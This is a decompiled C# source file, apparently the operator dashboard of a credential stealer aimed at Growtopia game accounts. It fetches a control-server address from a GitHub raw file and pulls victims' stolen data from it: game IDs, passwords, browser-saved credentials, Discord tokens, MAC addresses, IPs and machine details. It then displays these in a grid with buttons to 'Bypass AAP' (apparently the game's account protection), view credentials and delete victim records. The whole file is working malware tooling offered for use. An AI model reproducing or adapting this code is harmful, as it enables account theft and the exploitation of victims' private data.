using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Bunifu.Framework.UI;
using Microsoft.Win32;

namespace Trash
{
	// Token: 0x0200000C RID: 12
	public class HomeControl : UserControl
	{
		// Token: 0x06000084 RID: 132 RVA: 0x00002545 File Offset: 0x00000745
		public HomeControl()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000085 RID: 133 RVA: 0x00006178 File Offset: 0x00004378
		public string hardwareid()
		{
			string str = this.identifier("Win32_DiskDrive", "Model");
			string str2 = this.identifier("Win32_DiskDrive", "Manufacturer");
			string str3 = this.identifier("Win32_DiskDrive", "Signature");
			string str4 = this.identifier("Win32_DiskDrive", "TotalHeads");
			string s = str + str2 + str3 + str4;
			string result;
			using (SHA1Managed sha1Managed = new SHA1Managed())
			{
				byte[] array = sha1Managed.ComputeHash(Encoding.UTF8.GetBytes(s));
				StringBuilder stringBuilder = new StringBuilder(array.Length * 2);
				foreach (byte b in array)
				{
					stringBuilder.Append(b.ToString("X2"));
				}
				result = stringBuilder.ToString();
			}
			return result;
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00003FD4 File Offset: 0x000021D4
		public string identifier(string wmiClass, string wmiProperty)
		{
			string text = "";
			foreach (ManagementBaseObject managementBaseObject in new ManagementClass(wmiClass).GetInstances())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				if (text == "")
				{
					try
					{
						text = managementObject[wmiProperty].ToString();
						break;
					}
					catch
					{
					}
				}
			}
			return text;
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00006250 File Offset: 0x00004450
		public string requestData()
		{
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
			{
				string text = registryKey.OpenSubKey("trash\\lol").GetValue("ownr").ToString();
				string value = registryKey.OpenSubKey("trash\\lol").GetValue("aut").ToString();
				if (text != null)
				{
					using (WebClient webClient = new WebClient())
					{
						NameValueCollection nameValueCollection = new NameValueCollection();
						string value2 = this.hardwareid();
						nameValueCollection["owner"] = text;
						nameValueCollection["autid"] = value;
						nameValueCollection["ident"] = value2;
						string str = new WebClient().DownloadString("https://raw.githubusercontent.com/N-a-h/trashsrv/master/srvlink.txt");
						byte[] bytes = webClient.UploadValues(str + "/get.php", nameValueCollection);
						return Encoding.Default.GetString(bytes);
					}
				}
				result = null;
			}
			return result;
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00006350 File Offset: 0x00004550
		public static string DecompressString(string compressedText)
		{
			byte[] array = Convert.FromBase64String(compressedText);
			string @string;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				int num = BitConverter.ToInt32(array, 0);
				memoryStream.Write(array, 4, array.Length - 4);
				byte[] array2 = new byte[num];
				memoryStream.Position = 0L;
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
				{
					gzipStream.Read(array2, 0, array2.Length);
				}
				@string = Encoding.UTF8.GetString(array2);
			}
			return @string;
		}

		// Token: 0x06000089 RID: 137 RVA: 0x000063E4 File Offset: 0x000045E4
		private List<DataPacket> parseData(string packet)
		{
			List<DataPacket> result;
			try
			{
				if (packet.Contains("You don't"))
				{
					result = null;
				}
				else
				{
					string[] array = packet.Split("^".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
					List<DataPacket> list = new List<DataPacket>();
					foreach (string text in array)
					{
						try
						{
							DataPacket dataPacket = new DataPacket();
							string[] array3 = text.Split("|".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
							dataPacket.id = array3[0];
							string s = HomeControl.DecompressString(array3[1]);
							MemoryStream memoryStream = new MemoryStream(Encoding.Unicode.GetBytes(s));
							Data data = (Data)new DataContractJsonSerializer(typeof(Data)).ReadObject(memoryStream);
							dataPacket.gid = data.gid;
							dataPacket.MAC = data.MAC;
							dataPacket.passwords = data.passwords;
							dataPacket.user = data.user;
							dataPacket.lastworld = data.lastworld;
							dataPacket.volid = data.volid;
							try
							{
								dataPacket.token = data.token;
							}
							catch
							{
								dataPacket.token = null;
							}
							memoryStream.Close();
							dataPacket.browser = HomeControl.DecompressString(array3[2]);
							string text2 = HomeControl.DecompressString(array3[3]);
							char[] separator = new char[]
							{
								'|'
							};
							string[] array4 = text2.Split(separator, StringSplitOptions.RemoveEmptyEntries);
							if (array4.Length == 3)
							{
								dataPacket.computerInfo = array4[0];
								dataPacket.resolution = array4[1];
								dataPacket.os = array4[2];
							}
							else
							{
								dataPacket.computerInfo = "disabled";
								dataPacket.resolution = "disabled";
								dataPacket.os = "disabled";
							}
							dataPacket.ip = array3[4];
							dataPacket.date = array3[5];
							list.Add(dataPacket);
						}
						catch
						{
						}
					}
					result = list;
				}
			}
			catch
			{
				MessageBox.Show("Failed to parse data.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				result = null;
			}
			return result;
		}

		// Token: 0x0600008A RID: 138 RVA: 0x0000661C File Offset: 0x0000481C
		private void button1_Click(object sender, EventArgs e)
		{
			try
			{
				this.bunifuCustomDataGrid1.Rows.Clear();
				string packet = this.requestData();
				List<DataPacket> list = this.parseData(packet);
				if (list == null)
				{
					MessageBox.Show("You don't have any accounts", "R.I.P", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					try
					{
						for (int i = 0; i < list.Count; i++)
						{
							this.bunifuCustomDataGrid1.Rows.Add();
							this.bunifuCustomDataGrid1.Rows[i].Cells["ID"].Value = list[i].id;
							this.bunifuCustomDataGrid1.Rows[i].Cells["GrowID"].Value = list[i].gid;
							this.bunifuCustomDataGrid1.Rows[i].Cells["Passwords"].Value = list[i].passwords;
							this.bunifuCustomDataGrid1.Rows[i].Cells["MAC"].Value = list[i].MAC;
							this.bunifuCustomDataGrid1.Rows[i].Cells["Computer"].Value = list[i].computerInfo;
							this.bunifuCustomDataGrid1.Rows[i].Cells["User"].Value = list[i].user;
							this.bunifuCustomDataGrid1.Rows[i].Cells["Volume"].Value = list[i].volid;
							this.bunifuCustomDataGrid1.Rows[i].Cells["IP"].Value = list[i].ip;
							this.bunifuCustomDataGrid1.Rows[i].Cells["Date"].Value = list[i].date;
							this.bunifuCustomDataGrid1.Rows[i].Cells["Browser"].Value = list[i].browser;
							this.bunifuCustomDataGrid1.Rows[i].Cells["Resolution"].Value = list[i].resolution;
							this.bunifuCustomDataGrid1.Rows[i].Cells["Os"].Value = list[i].os;
							this.bunifuCustomDataGrid1.Rows[i].Cells["Lastworld"].Value = list[i].lastworld;
							this.bunifuCustomDataGrid1.Rows[i].Cells["token"].Value = list[i].token;
							this.bunifuCustomDataGrid1.Rows[i].DefaultCellStyle.BackColor = Color.AntiqueWhite;
						}
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message);
					}
				}
			}
			catch (Exception)
			{
				MessageBox.Show("You don't have any accounts or data parsing failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}

		// Token: 0x0600008B RID: 139 RVA: 0x000069B8 File Offset: 0x00004BB8
		private void bunifuCustomDataGrid1_CellClick(object sender, DataGridViewCellEventArgs e)
		{
			DataGridViewRow currentRow = this.bunifuCustomDataGrid1.CurrentRow;
			this.gid.Text = "GrowID: " + currentRow.Cells["GrowID"].Value.ToString();
			this.passLabel.Text = currentRow.Cells["Passwords"].Value.ToString();
			if (currentRow.Cells["token"].Value != null)
			{
				this.textBox1.Text = currentRow.Cells["token"].Value.ToString();
				return;
			}
			this.textBox1.Text = "fail";
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00006A74 File Offset: 0x00004C74
		private void button2_Click(object sender, EventArgs e)
		{
			DataGridViewRow currentRow = this.bunifuCustomDataGrid1.CurrentRow;
			try
			{
				new Bypass(currentRow.Cells["MAC"].Value.ToString()).Show();
			}
			catch (NullReferenceException)
			{
				MessageBox.Show("You can't bypass this account", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x0600008D RID: 141 RVA: 0x00006ADC File Offset: 0x00004CDC
		private void button3_Click(object sender, EventArgs e)
		{
			try
			{
				DataGridViewRow currentRow = this.bunifuCustomDataGrid1.CurrentRow;
				string datez;
				if (currentRow.Cells["Date"].Value != null)
				{
					datez = currentRow.Cells["Date"].Value.ToString();
				}
				else
				{
					datez = "";
				}
				string ipz;
				if (currentRow.Cells["IP"].Value != null)
				{
					ipz = currentRow.Cells["IP"].Value.ToString();
				}
				else
				{
					ipz = "";
				}
				string resolution;
				if (currentRow.Cells["Resolution"].Value != null)
				{
					resolution = currentRow.Cells["Resolution"].Value.ToString();
				}
				else
				{
					resolution = "";
				}
				string lastworld;
				if (currentRow.Cells["Lastworld"].Value != null)
				{
					lastworld = currentRow.Cells["Lastworld"].Value.ToString();
				}
				else
				{
					lastworld = "";
				}
				string pc;
				if (currentRow.Cells["Computer"].Value != null)
				{
					pc = currentRow.Cells["Computer"].Value.ToString();
				}
				else
				{
					pc = "";
				}
				string user;
				if (currentRow.Cells["User"].Value != null)
				{
					user = currentRow.Cells["User"].Value.ToString();
				}
				else
				{
					user = "";
				}
				new lolz(datez, ipz, resolution, lastworld, pc, user).ShowDialog();
			}
			catch (NullReferenceException)
			{
				MessageBox.Show("You didn't even choose an account!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			catch (Exception)
			{
				MessageBox.Show("UNknown error occured.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x0600008E RID: 142 RVA: 0x00006CF4 File Offset: 0x00004EF4
		private void button4_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.bunifuCustomDataGrid1.CurrentRow.Cells["Browser"].Value != null)
				{
					if (!this.bunifuCustomDataGrid1.CurrentRow.Cells["Browser"].Value.ToString().Contains("Password Grabber is disabled"))
					{
						string text = this.bunifuCustomDataGrid1.CurrentRow.Cells["Browser"].Value.ToString();
						char[] separator = new char[]
						{
							'^'
						};
						string[] array = text.Split(separator, StringSplitOptions.RemoveEmptyEntries);
						List<credentials.Browserz> list = new List<credentials.Browserz>();
						foreach (string s in array)
						{
							XmlObjectSerializer xmlObjectSerializer = new DataContractJsonSerializer(typeof(credentials.Browserz));
							MemoryStream memoryStream = new MemoryStream(Encoding.Unicode.GetBytes(s));
							credentials.Browserz item = (credentials.Browserz)xmlObjectSerializer.ReadObject(memoryStream);
							memoryStream.Position = 0L;
							new StreamReader(memoryStream).ReadToEnd();
							list.Add(item);
						}
						new credentials(list).ShowDialog();
					}
					else
					{
						MessageBox.Show("Unknown error or the grabber has been disabled.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
				}
			}
			catch (NullReferenceException)
			{
				MessageBox.Show("You didn't even choose an account!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			catch (Exception)
			{
				MessageBox.Show("UNknown error occured.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00006E84 File Offset: 0x00005084
		private void deleteAccountToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.bunifuCustomDataGrid1.CurrentRow != null)
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
				{
					string text = registryKey.OpenSubKey("trash\\lol").GetValue("ownr").ToString();
					if (text != null)
					{
						using (WebClient webClient = new WebClient())
						{
							string str = new WebClient().DownloadString("https://raw.githubusercontent.com/N-a-h/trashsrv/master/srvlink.txt");
							NameValueCollection nameValueCollection = new NameValueCollection();
							nameValueCollection["owner"] = text;
							nameValueCollection["id"] = this.bunifuCustomDataGrid1.CurrentRow.Cells["ID"].Value.ToString();
							byte[] bytes = webClient.UploadValues(str + "/memes.php", nameValueCollection);
							if (Encoding.Default.GetString(bytes).Contains("success"))
							{
								this.bunifuCustomDataGrid1.Rows.RemoveAt(this.bunifuCustomDataGrid1.CurrentRow.Index);
							}
							else
							{
								MessageBox.Show("Unknown error");
							}
						}
					}
					return;
				}
			}
			MessageBox.Show("You didn't even choose an account!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}

		// Token: 0x06000090 RID: 144 RVA: 0x000020C3 File Offset: 0x000002C3
		private void bunifuCustomDataGrid1_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00002553 File Offset: 0x00000753
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x06000092 RID: 146 RVA: 0x00006FCC File Offset: 0x000051CC
		private void InitializeComponent()
		{
			this.components = new Container();
			DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle3 = new DataGridViewCellStyle();
			this.bunifuCustomDataGrid1 = new BunifuCustomDataGrid();
			this.contextMenuStrip1 = new ContextMenuStrip(this.components);
			this.deleteAccountToolStripMenuItem = new ToolStripMenuItem();
			this.gid = new Label();
			this.label2 = new Label();
			this.button1 = new Button();
			this.label1 = new Label();
			this.button2 = new Button();
			this.button3 = new Button();
			this.passLabel = new Label();
			this.button4 = new Button();
			this.label3 = new Label();
			this.textBox1 = new TextBox();
			this.ID = new DataGridViewTextBoxColumn();
			this.token = new DataGridViewTextBoxColumn();
			this.Lastworld = new DataGridViewTextBoxColumn();
			this.Resolution = new DataGridViewTextBoxColumn();
			this.Os = new DataGridViewTextBoxColumn();
			this.GrowID = new DataGridViewTextBoxColumn();
			this.Browser = new DataGridViewTextBoxColumn();
			this.Date = new DataGridViewTextBoxColumn();
			this.Passwords = new DataGridViewTextBoxColumn();
			this.MAC = new DataGridViewTextBoxColumn();
			this.Computer = new DataGridViewTextBoxColumn();
			this.User = new DataGridViewTextBoxColumn();
			this.Volume = new DataGridViewTextBoxColumn();
			this.IP = new DataGridViewTextBoxColumn();
			((ISupportInitialize)this.bunifuCustomDataGrid1).BeginInit();
			this.contextMenuStrip1.SuspendLayout();
			base.SuspendLayout();
			this.bunifuCustomDataGrid1.AllowUserToAddRows = false;
			this.bunifuCustomDataGrid1.AllowUserToDeleteRows = false;
			this.bunifuCustomDataGrid1.AllowUserToResizeRows = false;
			dataGridViewCellStyle.BackColor = Color.FromArgb(224, 224, 224);
			this.bunifuCustomDataGrid1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
			this.bunifuCustomDataGrid1.BackgroundColor = Color.Gainsboro;
			this.bunifuCustomDataGrid1.BorderStyle = BorderStyle.None;
			this.bunifuCustomDataGrid1.CellBorderStyle = DataGridViewCellBorderStyle.SingleHorizontal;
			this.bunifuCustomDataGrid1.ColumnHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = Color.FromArgb(64, 64, 64);
			dataGridViewCellStyle2.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			dataGridViewCellStyle2.ForeColor = Color.White;
			dataGridViewCellStyle2.SelectionBackColor = SystemColors.Highlight;
			dataGridViewCellStyle2.SelectionForeColor = SystemColors.HighlightText;
			dataGridViewCellStyle2.WrapMode = DataGridViewTriState.True;
			this.bunifuCustomDataGrid1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
			this.bunifuCustomDataGrid1.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.bunifuCustomDataGrid1.Columns.AddRange(new DataGridViewColumn[]
			{
				this.ID,
				this.token,
				this.Lastworld,
				this.Resolution,
				this.Os,
				this.GrowID,
				this.Browser,
				this.Date,
				this.Passwords,
				this.MAC,
				this.Computer,
				this.User,
				this.Volume,
				this.IP
			});
			this.bunifuCustomDataGrid1.ContextMenuStrip = this.contextMenuStrip1;
			dataGridViewCellStyle3.Alignment = DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = SystemColors.Window;
			dataGridViewCellStyle3.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			dataGridViewCellStyle3.ForeColor = SystemColors.ControlText;
			dataGridViewCellStyle3.SelectionBackColor = SystemColors.ControlDark;
			dataGridViewCellStyle3.SelectionForeColor = SystemColors.HighlightText;
			dataGridViewCellStyle3.WrapMode = DataGridViewTriState.False;
			this.bunifuCustomDataGrid1.DefaultCellStyle = dataGridViewCellStyle3;
			this.bunifuCustomDataGrid1.DoubleBuffered = true;
			this.bunifuCustomDataGrid1.EnableHeadersVisualStyles = false;
			this.bunifuCustomDataGrid1.HeaderBgColor = Color.FromArgb(64, 64, 64);
			this.bunifuCustomDataGrid1.HeaderForeColor = Color.White;
			this.bunifuCustomDataGrid1.Location = new Point(285, 3);
			this.bunifuCustomDataGrid1.Name = "bunifuCustomDataGrid1";
			this.bunifuCustomDataGrid1.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
			this.bunifuCustomDataGrid1.RowHeadersVisible = false;
			this.bunifuCustomDataGrid1.RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
			this.bunifuCustomDataGrid1.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
			this.bunifuCustomDataGrid1.Size = new Size(397, 215);
			this.bunifuCustomDataGrid1.TabIndex = 0;
			this.bunifuCustomDataGrid1.CellClick += this.bunifuCustomDataGrid1_CellClick;
			this.bunifuCustomDataGrid1.CellContentClick += this.bunifuCustomDataGrid1_CellContentClick;
			this.contextMenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.deleteAccountToolStripMenuItem
			});
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new Size(181, 48);
			this.deleteAccountToolStripMenuItem.Name = "deleteAccountToolStripMenuItem";
			this.deleteAccountToolStripMenuItem.Size = new Size(180, 22);
			this.deleteAccountToolStripMenuItem.Text = "Delete account";
			this.deleteAccountToolStripMenuItem.Click += this.deleteAccountToolStripMenuItem_Click;
			this.gid.AutoSize = true;
			this.gid.Font = new Font("Segoe UI Semilight", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.gid.ForeColor = Color.White;
			this.gid.Location = new Point(19, 13);
			this.gid.Name = "gid";
			this.gid.Size = new Size(69, 21);
			this.gid.TabIndex = 1;
			this.gid.Text = "GrowID: ";
			this.label2.AutoSize = true;
			this.label2.Font = new Font("Segoe UI Semilight", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.label2.ForeColor = Color.White;
			this.label2.Location = new Point(19, 49);
			this.label2.Name = "label2";
			this.label2.Size = new Size(78, 21);
			this.label2.TabIndex = 2;
			this.label2.Text = "Password:";
			this.button1.BackColor = Color.FromArgb(64, 64, 64);
			this.button1.ForeColor = Color.White;
			this.button1.Location = new Point(325, 224);
			this.button1.Name = "button1";
			this.button1.Size = new Size(305, 45);
			this.button1.TabIndex = 14;
			this.button1.Text = "Retrieve data";
			this.button1.UseVisualStyleBackColor = false;
			this.button1.Click += this.button1_Click;
			this.label1.AutoSize = true;
			this.label1.Font = new Font("Segoe UI Semilight", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.label1.ForeColor = Color.White;
			this.label1.Location = new Point(19, 300);
			this.label1.Name = "label1";
			this.label1.Size = new Size(69, 21);
			this.label1.TabIndex = 15;
			this.label1.Text = "Actions: ";
			this.button2.BackColor = Color.FromArgb(64, 64, 64);
			this.button2.ForeColor = Color.White;
			this.button2.Location = new Point(106, 297);
			this.button2.Name = "button2";
			this.button2.Size = new Size(142, 31);
			this.button2.TabIndex = 16;
			this.button2.Text = "Bypass AAP";
			this.button2.UseVisualStyleBackColor = false;
			this.button2.Click += this.button2_Click;
			this.button3.BackColor = Color.FromArgb(64, 64, 64);
			this.button3.ForeColor = Color.White;
			this.button3.Location = new Point(265, 297);
			this.button3.Name = "button3";
			this.button3.Size = new Size(142, 31);
			this.button3.TabIndex = 17;
			this.button3.Text = "Extra Info";
			this.button3.UseVisualStyleBackColor = false;
			this.button3.Click += this.button3_Click;
			this.passLabel.AutoSize = true;
			this.passLabel.Font = new Font("Cambria", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.passLabel.ForeColor = Color.White;
			this.passLabel.Location = new Point(102, 51);
			this.passLabel.Name = "passLabel";
			this.passLabel.Size = new Size(12, 19);
			this.passLabel.TabIndex = 18;
			this.passLabel.Text = ".";
			this.button4.BackColor = Color.FromArgb(64, 64, 64);
			this.button4.ForeColor = Color.White;
			this.button4.Location = new Point(425, 297);
			this.button4.Name = "button4";
			this.button4.Size = new Size(142, 31);
			this.button4.TabIndex = 19;
			this.button4.Text = "View credentials";
			this.button4.UseVisualStyleBackColor = false;
			this.button4.Click += this.button4_Click;
			this.label3.AutoSize = true;
			this.label3.Font = new Font("Segoe UI Semilight", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.label3.ForeColor = Color.White;
			this.label3.Location = new Point(19, 87);
			this.label3.Name = "label3";
			this.label3.Size = new Size(109, 21);
			this.label3.TabIndex = 20;
			this.label3.Text = "Discord token:";
			this.textBox1.BackColor = Color.FromArgb(64, 64, 64);
			this.textBox1.BorderStyle = BorderStyle.FixedSingle;
			this.textBox1.Font = new Font("Times New Roman", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 204);
			this.textBox1.ForeColor = Color.White;
			this.textBox1.Location = new Point(23, 121);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new Size(225, 20);
			this.textBox1.TabIndex = 21;
			this.ID.Frozen = true;
			this.ID.HeaderText = "Account ID";
			this.ID.Name = "ID";
			this.ID.ReadOnly = true;
			this.token.Frozen = true;
			this.token.HeaderText = "token";
			this.token.Name = "token";
			this.token.ReadOnly = true;
			this.token.Visible = false;
			this.Lastworld.Frozen = true;
			this.Lastworld.HeaderText = "Lastworld";
			this.Lastworld.Name = "Lastworld";
			this.Lastworld.ReadOnly = true;
			this.Lastworld.Visible = false;
			this.Resolution.Frozen = true;
			this.Resolution.HeaderText = "Resolution";
			this.Resolution.Name = "Resolution";
			this.Resolution.ReadOnly = true;
			this.Resolution.Visible = false;
			this.Os.Frozen = true;
			this.Os.HeaderText = "Os";
			this.Os.Name = "Os";
			this.Os.ReadOnly = true;
			this.Os.Visible = false;
			this.GrowID.Frozen = true;
			this.GrowID.HeaderText = "GrowID";
			this.GrowID.Name = "GrowID";
			this.GrowID.ReadOnly = true;
			this.GrowID.Width = 150;
			this.Browser.Frozen = true;
			this.Browser.HeaderText = "Browser";
			this.Browser.Name = "Browser";
			this.Browser.ReadOnly = true;
			this.Browser.Visible = false;
			this.Date.Frozen = true;
			this.Date.HeaderText = "Date";
			this.Date.Name = "Date";
			this.Date.ReadOnly = true;
			this.Date.Width = 150;
			this.Passwords.Frozen = true;
			this.Passwords.HeaderText = "Passwords";
			this.Passwords.Name = "Passwords";
			this.Passwords.ReadOnly = true;
			this.Passwords.Visible = false;
			this.MAC.Frozen = true;
			this.MAC.HeaderText = "MACs";
			this.MAC.Name = "MAC";
			this.MAC.ReadOnly = true;
			this.MAC.Visible = false;
			this.Computer.Frozen = true;
			this.Computer.HeaderText = "Computer";
			this.Computer.Name = "Computer";
			this.Computer.ReadOnly = true;
			this.Computer.Visible = false;
			this.User.Frozen = true;
			this.User.HeaderText = "Username";
			this.User.Name = "User";
			this.User.ReadOnly = true;
			this.User.Visible = false;
			this.Volume.Frozen = true;
			this.Volume.HeaderText = "Volume ID";
			this.Volume.Name = "Volume";
			this.Volume.ReadOnly = true;
			this.Volume.Visible = false;
			this.IP.Frozen = true;
			this.IP.HeaderText = "IP";
			this.IP.Name = "IP";
			this.IP.ReadOnly = true;
			this.IP.Visible = false;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(64, 64, 64);
			base.Controls.Add(this.textBox1);
			base.Controls.Add(this.label3);
			base.Controls.Add(this.button4);
			base.Controls.Add(this.passLabel);
			base.Controls.Add(this.button3);
			base.Controls.Add(this.button2);
			base.Controls.Add(this.label1);
			base.Controls.Add(this.button1);
			base.Controls.Add(this.label2);
			base.Controls.Add(this.gid);
			base.Controls.Add(this.bunifuCustomDataGrid1);
			base.Name = "HomeControl";
			base.Size = new Size(708, 334);
			((ISupportInitialize)this.bunifuCustomDataGrid1).EndInit();
			this.contextMenuStrip1.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000055 RID: 85
		private IContainer components;

		// Token: 0x04000056 RID: 86
		private BunifuCustomDataGrid bunifuCustomDataGrid1;

		// Token: 0x04000057 RID: 87
		private Label gid;

		// Token: 0x04000058 RID: 88
		private Label label2;

		// Token: 0x04000059 RID: 89
		private Button button1;

		// Token: 0x0400005A RID: 90
		private Label label1;

		// Token: 0x0400005B RID: 91
		private Button button2;

		// Token: 0x0400005C RID: 92
		private Button button3;

		// Token: 0x0400005D RID: 93
		private Label passLabel;

		// Token: 0x0400005E RID: 94
		private Button button4;

		// Token: 0x0400005F RID: 95
		private ContextMenuStrip contextMenuStrip1;

		// Token: 0x04000060 RID: 96
		private ToolStripMenuItem deleteAccountToolStripMenuItem;

		// Token: 0x04000061 RID: 97
		private Label label3;

		// Token: 0x04000062 RID: 98
		private TextBox textBox1;

		// Token: 0x04000063 RID: 99
		private DataGridViewTextBoxColumn ID;

		// Token: 0x04000064 RID: 100
		private DataGridViewTextBoxColumn token;

		// Token: 0x04000065 RID: 101
		private DataGridViewTextBoxColumn Lastworld;

		// Token: 0x04000066 RID: 102
		private DataGridViewTextBoxColumn Resolution;

		// Token: 0x04000067 RID: 103
		private DataGridViewTextBoxColumn Os;

		// Token: 0x04000068 RID: 104
		private DataGridViewTextBoxColumn GrowID;

		// Token: 0x04000069 RID: 105
		private DataGridViewTextBoxColumn Browser;

		// Token: 0x0400006A RID: 106
		private DataGridViewTextBoxColumn Date;

		// Token: 0x0400006B RID: 107
		private DataGridViewTextBoxColumn Passwords;

		// Token: 0x0400006C RID: 108
		private DataGridViewTextBoxColumn MAC;

		// Token: 0x0400006D RID: 109
		private DataGridViewTextBoxColumn Computer;

		// Token: 0x0400006E RID: 110
		private DataGridViewTextBoxColumn User;

		// Token: 0x0400006F RID: 111
		private DataGridViewTextBoxColumn Volume;

		// Token: 0x04000070 RID: 112
		private DataGridViewTextBoxColumn IP;
	}
}
